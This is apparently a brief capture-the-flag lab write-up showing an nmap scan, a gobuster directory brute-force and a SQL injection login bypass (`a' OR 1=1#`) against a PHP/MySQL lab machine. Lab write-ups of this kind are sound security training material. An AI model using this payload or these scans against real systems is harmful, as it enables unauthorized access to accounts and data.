# SQLi (mysql)

## Scan

```bash
nmap -sV -T5 10.129.210.87
```

Port 80 is exposed (an apache server!)

## gobuster

```bash
gobuster dir -u 10.129.210.87 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

(did not find any useful routes, but we have found out it is written in php, so easier to fo sql injection)

## SQL injection

successfully logged in using `a' OR 1=1#` (dont even need to know the username)
